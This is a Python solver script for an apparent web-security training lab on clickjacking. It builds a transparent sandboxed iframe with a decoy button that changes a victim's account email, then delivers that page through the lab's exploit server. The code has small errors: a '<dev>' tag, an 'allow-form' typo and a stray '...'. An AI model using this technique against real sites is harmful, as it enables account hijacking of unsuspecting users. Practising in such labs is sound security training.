####################################################################
#
# Lab: Clickjacking with a frame buster script
#
# Hack Steps:
#      1. Adjust the frame dimensions and the decoy button offset
#      2. Set the email field using a URL query parameter
#      3. Set the sandbox attribute of the iframe to "allow-form" 
#         to bypass the frame buster script
#      4. Deliver the exploit to the victim
#
####################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0afe00c80339e60b841a972e006a0053.web-security-academy.net"

# Change this to your exploit server URL
EXPLOIT_SERVER_URL = "https://exploit-0aee00e7034fe6f7843b961e016800f4.exploit-server.net"

def main():
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    frame_width = 700
    frame_height = 700
    decoy_button_top = 450
    decoy_button_left = 100
    new_email = "hacked@you.com"; # You can change this to what you want
    payload = f"""<head>
                        <style>
                            #target_website {{
                                position: relative;
                                width: {frame_width}px;
                                height: {frame_height}px;
                                opacity: 0.0001;
                                z-index: 2;
                                }}
                            #decoy_website {{
                                position: absolute;
                                top: {decoy_button_top}px;
                                left: {decoy_button_left}px;
                                z-index: 1;
                                }}
                        </style>
                    </head>
                    ...
                    <body>
                        <dev id="decoy_website"> Click me </dev>
                        <iframe id="target_website" src="{LAB_URL}/my-account?email={new_email}" sandbox="allow-forms"></iframe>
                    </body>"""
    data = { "responseBody": payload, "responseHead": response_head, "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit" }

    print("❯❯ Delivering the exploit to the victim.. ", end="", flush=True)
    
    try:
        requests.post(EXPLOIT_SERVER_URL, data)

    except:
        print(Fore.RED + "⦗!⦘ Failed to deliver the exploit to the victim through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The victim's email will be changed after clicking on the decoy button") 
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()


